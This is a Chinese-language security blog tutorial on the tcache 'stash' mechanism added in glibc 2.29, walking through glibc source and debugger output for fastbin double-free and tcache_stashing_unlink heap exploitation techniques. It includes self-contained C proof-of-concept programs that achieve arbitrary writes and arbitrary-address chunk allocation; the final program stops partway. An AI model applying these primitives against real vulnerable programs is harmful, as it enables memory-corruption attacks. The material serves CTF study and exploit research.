> 原文链接: https://www.anquanke.com//post/id/222079 


# glibc 2.29引入 stash 机制后引起的相关漏洞学习


                                阅读量   
                                **148534**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01d0eb3a6bf75eaa99.jpg)](https://p1.ssl.qhimg.com/t01d0eb3a6bf75eaa99.jpg)



以下示例的libc源码均为libc2.31.

## fastbin的stash机制

这里分析一下对于fastbin的stash机制

```
if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast())) //size在fastbin范围内
  `{`
    idx = fastbin_index(nb);
    mfastbinptr *fb = &amp;fastbin(av, idx);
    mchunkptr pp;
    victim = *fb;

    if (victim != NULL) //如果有chunk
    `{`
      if (SINGLE_THREAD_P)
        *fb = victim-&gt;fd; //取出头chunk
      else
        REMOVE_FB(fb, pp, victim);

      if (__glibc_likely(victim != NULL)) 
      `{`
        size_t victim_idx = fastbin_index(chunksize(victim));
        if (__builtin_expect(victim_idx != idx, 0)) //对fastbin的size检查
          malloc_printerr("malloc(): memory corruption (fast)");
        check_remalloced_chunk(av, victim, nb);

 //if USE_TCACHE，且看到此fastbin链表下，存在相同大小的bins（也就是一条chain），进行Stash。过程：把剩下的bins放入Tcache中
        /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
        size_t tc_idx = csize2tidx(nb);
        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) //如果属于tcache管辖范围
        `{`
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks.  */
          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) //只要tcache没满，并且fastbin还有chunk
          `{`
            if (SINGLE_THREAD_P)  //从fastbin中取出
              *fb = tc_victim-&gt;fd;
            else
            `{`
              REMOVE_FB(fb, pp, tc_victim);
              if (__glibc_unlikely(tc_victim == NULL))
                break;
            `}`
            tcache_put(tc_victim, tc_idx);//放入tcache中
          `}`
        `}`
#endif
        void *p = chunk2mem(victim);
        alloc_perturb(p, bytes);
        return p;
      `}`
    `}`
  `}`
```

也就是比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。

### <a class="reference-link" name="Tcache%20Stashing%20%E9%81%87%E4%B8%8A%20fastbin%20double%20free"></a>Tcache Stashing 遇上 fastbin double free

假设有个double free可以触发，其用到fastbin上：<br>
进行free 多次构成：

[![](https://ctf.timelinesec.com/media/images/2020/11/04/a2fa9e92-eb5a-4922-9948-a3073703e208-CP7Bv0LT.png)](https://ctf.timelinesec.com/media/images/2020/11/04/a2fa9e92-eb5a-4922-9948-a3073703e208-CP7Bv0LT.png)

为了触发stash，先申请完tcache里的chunk，让其为空，（或者让其不满也可以）

然后再申请一下同size的chunk，就会触发stash。也是其精妙之处，在glibc2.27以下，往往是这样的构造：

[![](https://ctf.timelinesec.com/media/images/2020/11/04/07249824-44dc-460d-9d00-0065c678ad24-sOxo7Q27.png)](https://ctf.timelinesec.com/media/images/2020/11/04/07249824-44dc-460d-9d00-0065c678ad24-sOxo7Q27.png)

主要由于fastbin 取出时，其会检查size是否相符合，导致很受限制。此时其基本就是可以攻击带有0x7f,去攻击libc上的内存。

但是有了stash这个机制，其就变成了以下的情况：

[![](https://ctf.timelinesec.com/media/images/2020/11/04/ed4be4df-7d1b-48f5-b784-71ad656af08c-UMaPV51L.png)](https://ctf.timelinesec.com/media/images/2020/11/04/ed4be4df-7d1b-48f5-b784-71ad656af08c-UMaPV51L.png)

由于上来申请同size的chunk时触发了stash机制，其会把fastbin里剩下的chunk放入到tcache中。由于chunk 7的fd是可以控制的，写入tag地址，然后放入chain的chunk ，也就是chunk 8 、7 、tag 。这就相当于劫持了tcache chain，可以实现任意地址写。

### <a class="reference-link" name="%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98"></a>相关例题
- bytectf2020 gun （libc2.31）
- 太湖杯 seven hero （libc2.29）


## smallbin的stash机制

对于smallbin的stash机制：

```
if (in_smallbin_range (nb))
    `{`
      idx = smallbin_index (nb);
      bin = bin_at (av, idx); //smallbin 从chain尾开始取到的chunk的fd位位 bin值 （根据 FIFO，即为最先放入的 Chunk）

      if ((victim = last (bin)) != bin) //victim 即为刚刚取到的chunk
        `{`
          bck = victim-&gt;bk; //获取倒数第二个chunk  
      if (__glibc_unlikely (bck-&gt;fd != victim)) //验证双向链表是否正常
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin-&gt;bk = bck;
          bck-&gt;fd = bin;
          //将 bin 的 bk 指向 victim 的后一个 Chunk，将 victim 后一个 Chunk 的 fd 指向 bin，即将 victim 取出
          if (av != &amp;main_arena)
        set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb); //获取对应size的tcache索引
      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
        `{`
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks over.  */
          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
             &amp;&amp; (tc_victim = last (bin)) != bin)   //#define last(b)      ((b)-&gt;bk)  也就是 tc_victim = bin-&gt;bk
        `{`
          if (tc_victim != 0)
            `{`
              bck = tc_victim-&gt;bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &amp;main_arena)
            set_non_main_arena (tc_victim);
              bin-&gt;bk = bck;
              bck-&gt;fd = bin;
          //将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出
              tcache_put (tc_victim, tc_idx);
                `}`
        `}`
        `}`
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        `}`
    `}`
```

也就是在smallbin分配之后，如果smallbin链表中仍然存在堆块，并且对应的tcache list没有满chain的话，就会将small bin链表中所有的堆块放入到相应的tcache中。

**当然要发生这种分配的方式，必须要越过tcache优先分配堆块，calloc的分配是不从tcache bin里取chunk的，即可满足。**

下面跟着示例代码和glibc相关源码调试来学习一下：

### `tcache_stashing_unlink`

#### <a class="reference-link" name="%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"></a>示例代码

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;inttypes.h&gt;

static uint64_t victim = 0;

int main(int argc, char **argv)`{`
    setbuf(stdout, 0);
    setbuf(stderr, 0);

    char *t1;
    char *s1, *s2, *pad;
    char *tmp;

    printf("You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n");

    printf("\n1. need to know heap address and the victim address that you need to attack\n");

    tmp = malloc(0x1);
    printf("victim's address: %p, victim's vaule: 0x%lx\n", &amp;victim, victim);
    printf("heap address: %p\n", tmp-0x260);

    printf("\n2. choose a stable size and free six identical size chunks to tcache_entry list\n");
    printf("Here, I choose the size 0x60\n");
    for(int i=0; i&lt;6; i++)`{`
        t1 = calloc(1, 0x50);
        free(t1);
    `}`

    printf("Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n", 
        t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4, t1-0x60*5);

    printf("\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");
    /* 将两个大小相同的块（如tcache_entry）释放到相应的smallbin中 */
    s1 = malloc(0x420);
    printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
    pad = malloc(0x20);
    printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
    free(s1);
    printf("Free chunk %p to unsortedbin\n", s1);
    malloc(0x3c0);
    printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
    malloc(0x100);
    printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
    printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);

    printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
    printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
    s2 = malloc(0x420);
    pad = malloc(0x80);
    free(s2);
    malloc(0x3c0);
    malloc(0x100);
    printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
    printf("smallbin[4] list is %p &lt;--&gt; %p\n", s2+0x3c0, s1+0x3c0);

    printf("\n4. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n");

    printf("Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&amp;victim)-0x10);
    *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;

    printf("\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");

    calloc(1, 0x50);

    printf("Finally, the victim's value is changed to a big number\n");
    printf("Now, victim's value: 0x%lx\n", victim);
    return 0;
`}`
```

#### <a class="reference-link" name="%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4"></a>编译命令

```
gcc  -g ./tcache_stashing_unlink.c -o tcache_stashing_unlink
```

-g 编译是可以让gdb显示源码

#### <a class="reference-link" name="%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"></a>调试过程

```
for(int i=0; i&lt;6; i++)`{`
        t1 = calloc(1, 0x50);
        free(t1);
    `}`
```

```
(0x60)   tcache_entry[4](6): 0x5555555594a0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0
```

先往tcache 中0x60的bin chain 上放入6个bin.。

接着将两个大小相同的块（如`tcache_entry`）释放到相应的smallbin中。

```
s1 = malloc(0x420);
    printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
    pad = malloc(0x20);
    printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
    free(s1);
    printf("Free chunk %p to unsortedbin\n", s1);
```

```
pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559950 (size : 0x206b0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x5555555594f0 (size : 0x430)
```

```
malloc(0x3c0);
    printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
    malloc(0x100);
```

```
pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559950 (size : 0x206b0) 
       last_remainder: 0x5555555598c0 (size : 0x60) 
            unsortbin: 0x5555555598c0 (size : 0x60)
(0x60)   tcache_entry[4](6): 0x5555555594a0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0
```

可以看到0x5555555598c0是在`last_remainder`之中的，由于其不会进入tcache的特性，就可以进入到smallbin中。

```
pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559a60 (size : 0x205a0) 
       last_remainder: 0x5555555598c0 (size : 0x60) 
            unsortbin: 0x0
(0x060)  smallbin[ 4]: 0x5555555598c0
(0x60)   tcache_entry[4](6): 0x5555555594a0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0
```

接着重复这个步骤，在构造一个进入smallbin的chunk。

```
printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
    printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
    s2 = malloc(0x420);
    pad = malloc(0x80); //防止合并的pad chunk，其必须大于0x60
    free(s2);
    malloc(0x3c0);
    malloc(0x100);
```

```
pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555a030 (size : 0x1ffd0) 
       last_remainder: 0x555555559e30 (size : 0x60) 
            unsortbin: 0x0
(0x060)  smallbin[ 4]: 0x555555559e30  &lt;--&gt; 0x5555555598c0
(0x60)   tcache_entry[4](6): 0x5555555594a0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0
```

可以看到已经完成构造了。接着进行change 0x555555559e30 的bk为目标地址-0x10。

```
*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;
```

原始：

```
pwndbg&gt; x/30gx 0x555555559e30
0x555555559e30: 0x0000000000000000      0x0000000000000061
0x555555559e40: 0x00005555555598c0      0x00007ffff7fb9c30
```

change 后：

```
pwndbg&gt; x/30gx 0x555555559e30
0x555555559e30: 0x0000000000000000      0x0000000000000061
0x555555559e40: 0x00005555555598c0      0x0000555555558040
0x555555559e50: 0x0000000000000000      0x0000000000000000
```

再看下即将被calloc申请到的smallbin：

```
pwndbg&gt; x/30gx 0x5555555598c0
0x5555555598c0: 0x0000000000000000      0x0000000000000061
0x5555555598d0: 0x00007ffff7fb9c30      0x0000555555559e30
```

```
calloc(1, 0x50);
```

其先会进行一个解链：

```
if (in_smallbin_range (nb))
    `{`
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        `{`
          bck = victim-&gt;bk; //1
      if (__glibc_unlikely (bck-&gt;fd != victim)) //2 明显是可以通过其双向链表的检查，会被正常的解链
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin-&gt;bk = bck;
          bck-&gt;fd = bin;

          if (av != &amp;main_arena)
        set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
```

接着会进行stash：

```
#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb);
      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
        `{`
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks over.  */
          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
             &amp;&amp; (tc_victim = last (bin)) != bin)
        `{`
          if (tc_victim != 0)
            `{`
              bck = tc_victim-&gt;bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &amp;main_arena)
            set_non_main_arena (tc_victim);
              bin-&gt;bk = bck;
              bck-&gt;fd = bin;

              tcache_put (tc_victim, tc_idx);
                `}`
        `}`
```

可以看到这一块，并没有进行双向链表的检查。其中`bck-&gt;fd = bin;`这个也就是对于 (&amp;tag – 0x10) + 0x10 = bin。也就是将目标地址上的值赋为 bin，这样就实现了等价于 unsortedbin Attack 的操作。

```
pwndbg&gt; x/30gx 0x0000555555558050
0x555555558050 &lt;victim&gt;:        0x00007ffff7fb9c30      0x0000000000000000
```

可以看到攻击已经成功。

```
0x60)   tcache_entry[4](7): 0x555555559e40 --&gt; 0x5555555594a0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0
```

且已经满chain，结束了stash的过程。

需要注意的是，刚才描述的放入过程是一个循环，我们将伪造的bck看成一个堆块，其bk很可能是一个非法的地址，这样就导致循环到下一个堆块时unlink执行到`bck-&gt;fd = bin;`访问非法内存造成程序crash。所以开始，选择释放6个对应size的chunk到tcache bin，只为tcache留一个空间，这样循环一次就会跳出，不会有后续问题。

#### <a class="reference-link" name="%E5%B0%8F%E6%80%BB%E7%BB%93"></a>小总结
- 先放入 2 个 Chunk 到 smallbins，6 个 Chunk 到对应的 tcache；
- 然后在不破坏 fd 的情况下,将后放入 smallbins 的 chunk 的 bk 设置为目标地址减 0x10。
- 这样再用calloc向 smallbins 申请对应大小的 Chunk 时，先放入 smallbins 的 Chunk 被分配给用户，然后触发 stash 机制。`bck = tc_victim-&gt;bk;`此时的 bck 就是目标地址减 0x10，之后`bck-&gt;fd = bin;` 也就是将目标地址上的值赋为 bin，写上了`main_arena`的地址，这样就实现了等价于 unsortedbin attack 的操作；
- 之后再调用 `tcache_put` 把后放入 smallbins 的 Chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 Chunk，在这次之后达到了阈值，所以也就退出了 stash 循环，整个流程就会正常结束。
### `tcache_stashing_unlink plus`

#### <a class="reference-link" name="%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"></a>示例代码

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;inttypes.h&gt;
static uint64_t victim[4] = `{`0, 0, 0, 0`}`;

int main(int argc, char **argv)`{`
    setbuf(stdout, 0);
    setbuf(stderr, 0);

    char *t1;
    char *s1, *s2, *pad;
    char *tmp;

    printf("You can use this technique to get a tcache chunk to arbitrary address\n");

    printf("\n1. need to know heap address and the victim address that you need to attack\n");

    tmp = malloc(0x1);
    printf("victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
        &amp;victim, victim[0], victim[1], victim[2], victim[3]);
    printf("heap address: %p\n", tmp-0x260);

    printf("\n2. change victim's data, make victim[1] = &amp;victim, or other address to writable address\n");
    //只要是一个可以写的指针地址即可，不一定是&amp;victim
    victim[1] = (uint64_t)(&amp;victim);
    printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
        victim[0], victim[1], victim[2], victim[3]);


    printf("\n3. choose a stable size and free five identical size chunks to tcache_entry list\n");
    printf("Here, I choose the size 0x60\n");
    for(int i=0; i&lt;5; i++)`{`
        t1 = calloc(1, 0x50);
        free(t1);
    `}`

    printf("Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n", 
        t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);

    printf("\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");

    s1 = malloc(0x420);
    printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
    pad = malloc(0x20);
    printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
    free(s1);
    printf("Free chunk %p to unsortedbin\n", s1);
    malloc(0x3c0);
    printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
    malloc(0x100);
    printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
    printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);

    printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
    printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
    s2 = malloc(0x420);
    pad = malloc(0x80);
    free(s2);
    malloc(0x3c0);
    malloc(0x100);
    printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
    printf("smallbin[4] list is %p &lt;--&gt; %p\n", s2+0x3c0, s1+0x3c0);

    printf("\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n");
    printf("Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&amp;victim)-0x10);
    *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;

    printf("\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");

    calloc(1, 0x50);
    printf("Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n", 
        &amp;victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);

    printf("Apply to tcache_entry[4], you can get a pointer to victim address\n");

    uint64_t *r = (uint64_t*)malloc(0x50);
    r[0] = 0xaa;
    r[1] = 0xbb;
    r[2] = 0xcc;
    r[3] = 0xdd;

    printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
        victim[0], victim[1], victim[2], victim[3]);

    return 0;
`}`
```

由于大多地方调试信息都相似，只分析一下重点处的相关信息：

#### <a class="reference-link" name="%E9%87%8D%E7%82%B9%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"></a>重点调试过程

```
b 70
```

先断在源程序代码的第70行，下面紧跟着的是calloc.<br>
看下内存信息：<br>
被恶意chage的smallbin chunk：

```
pwndbg&gt; x/30gx 0x555555559dd0
0x555555559dd0: 0x0000000000000000      0x0000000000000061
0x555555559de0: 0x0000555555559860      0x0000555555558050(tag-0x10)
```

即将被取走的smallbin chunk：

```
pwndbg&gt; x/30gx 0x0000555555559860
0x555555559860: 0x0000000000000000      0x0000000000000061
0x555555559870: 0x00007ffff7fbac30      0x0000555555559dd0
```

接着si进入calloc内部,进入malloc.c：

```
pwndbg&gt; b 3654
Breakpoint 3 at 0x7ffff7e69c87: file malloc.c, line 3655.
```

直接断在stash区进行分析:

##### <a class="reference-link" name="%E7%AC%AC%E4%B8%80%E8%BD%AE%E7%9A%84stash%EF%BC%9A"></a>第一轮的stash：

```
if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
        `{`
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks over.  */
          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
             &amp;&amp; (tc_victim = last (bin)) != bin)   //#define last(b)      ((b)-&gt;bk)  也就是 tc_victim = bin-&gt;bk
```

```
pwndbg&gt; p tc_victim
$19 = (mchunkptr) 0x555555559dd0
```

```
pwndbg&gt; x/30gx 0x555555559dd0
0x555555559dd0: 0x0000000000000000      0x0000000000000061
0x555555559de0: 0x00007ffff7fbac30      0x0000555555558050
```

```
`{`
          if (tc_victim != 0)
            `{`
              bck = tc_victim-&gt;bk; //bck = tag-0x10
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &amp;main_arena)
            set_non_main_arena (tc_victim);
              bin-&gt;bk = bck; //tag - 0x10 被写在bin-&gt;bk处
              bck-&gt;fd = bin; //bin 被写在tag处
          //将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出
              tcache_put (tc_victim, tc_idx);
                `}`
        `}`
```

```
pwndbg&gt; x/30gx 0x0000555555558050
0x555555558050: 0x0000000000000000      0x0000000000000000
0x555555558060 &lt;victim&gt;:        0x00007ffff7fbac30      0x0000555555558060
0x555555558070 &lt;victim+16&gt;:     0x0000000000000000      0x0000000000000000
```

```
pwndbg&gt; x/30gx 0x00007ffff7fbac30
0x7ffff7fbac30 &lt;main_arena+176&gt;:        0x00007ffff7fbac20      0x00007ffff7fbac20
0x7ffff7fbac40 &lt;main_arena+192&gt;:        0x0000555555559dd0      0x0000555555558050（tag - 0x10）
```

tcache 放入了 `tc_victim = 0x555555559de0`

```
(0x60)   tcache_entry[4](6): 0x555555559de0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0
```

##### <a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E8%BD%AE%E7%9A%84stash%EF%BC%9A"></a>第二轮的stash：

重点攻击的是`tc_victim` 也就是目标地址。

```
pwndbg&gt; p tc_victim
$21 = (mchunkptr) 0x555555558050
```

很明显最终目标也就是保证让`tc_victim`放入tcache即可。观察代码，可以发现仅需要保证的也就是不要让程序crush。

```
if (tc_victim != 0)
            `{`
            //得保证目标地址chunk的bk为可写的指针
              bck = tc_victim-&gt;bk; //tag-0x10-&gt;bk=bck =tag+8 
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &amp;main_arena)
            set_non_main_arena (tc_victim);
              bin-&gt;bk = bck;
              bck-&gt;fd = bin; //保证一个可写的bck，程序即可正常的执行

          //将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出
              tcache_put (tc_victim, tc_idx);
```

其得保证`tc_victim-&gt;bk`是一个可写指针，此示例程序是`&amp;victim`，是其他的也是可以的。

```
pwndbg&gt; x/30gx 0x555555558050
0x555555558050: 0x0000000000000000      0x0000000000000000
0x555555558060 &lt;victim&gt;:        0x00007ffff7fbac30      0x0000555555558060
0x555555558070 &lt;victim+16&gt;:     0x0000000000000000      0x0000000000000000
```

```
pwndbg&gt; p bck
$22 = (mchunkptr) 0x555555558060 &lt;victim&gt;
```

执行完毕后，获得一个目标地址的chunk进入了tcache，也达到了阈值，也就退出了 stash 循环。<br>
并且再次申请一下就得到一个目标地址的chunk。

```
(0x60)   tcache_entry[4](7): 0x555555558060 --&gt; 0x555555559de0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0
```

#### <a class="reference-link" name="%E5%B0%8F%E6%80%BB%E7%BB%93"></a>小总结
- 先放入 2 个 Chunk 到 Smallbins，5 个 Chunk 到对应的 tcache
<li>在不破坏 fd 的情况下，**将后放入 Smallbins 的 Chunk 的 bk 设置为目标地址减 0x10，同时要将目标地址加 0x8 处的值设置为一个指向一处可写内存的指针；**
</li>
- 接着用calloc触发stash 机制，会将后放入 Smallbins 的 Chunk 被放入 tcache，此时的 bin-&gt;bk 就是目标地址减 0x10，相当于把目标地址减 0x10 的指针链接进了 smallbins 中。
- 之后不满足终止条件，会进行下一次的 stash，这时的 `tc_victim` 就是目标地址。接下来由于原来的设置，目标地址加 0x8 处的指针是一个可写指针，保证stash流程正常走完。
- 最后目标地址就会被放入 `tcache_entry`的头部，stash 满足终止条件而终止。
重点在攻击最后一个进入smallbin的bk指针，让其指向目标地址-0x10的地方，并且**保证目标地址+8的位置为一个可写的指针。**

### `tcache_stashing_unlink plus plus`

也就是可以同时实现上面的2个功能。
- 任意地址分配一个chunk
- 任意地址写入一个`main_arena`附近的值
#### <a class="reference-link" name="%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"></a>示例代码

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;inttypes.h&gt;

static uint64_t victim[4] = `{`0, 0, 0, 0`}`;
static uint64_t victim2 = 0;

int main(int argc, char **argv)`{`
    setbuf(stdout, 0);
    setbuf(stderr, 0);

    char *t1;
    char *s1, *s2, *pad;
    char *tmp;

    printf("You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n");

    printf("\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n");

    tmp = malloc(0x1);
    printf("victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
        &amp;victim, victim[0], victim[1], victim[2], victim[3]);
    printf("victim2's address: %p, victim2's value: 0x%lx\n",
        &amp;victim2, victim2);
    printf("heap address: %p\n", tmp-0x260);

    printf("\n2. change victim's data, make victim[1] = &amp;victim2-0x10\n");
    victim[1] = (uint64_t)(&amp;victim2)-0x10;
    printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
        victim[0], victim[1], victim[2], victim[3]);


    printf("\n3. choose a stable size and free five identical size chunks to tcache_entry list\n");
    printf("Here, I choose the size 0x60\n");
    for(int i=0; i&lt;5; i++)`{`
        t1 = calloc(1, 0x50);
        free(t1);
    `}`

    printf("Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n", 
        t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);

    printf("\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");

    s1 = malloc(0x420);
    printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
    pad = malloc(0x20);
    printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
    free(s1);
    printf("Free chunk %p to unsortedbin\n", s1);
    malloc(0x3c0);
    printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
    malloc(0x100);
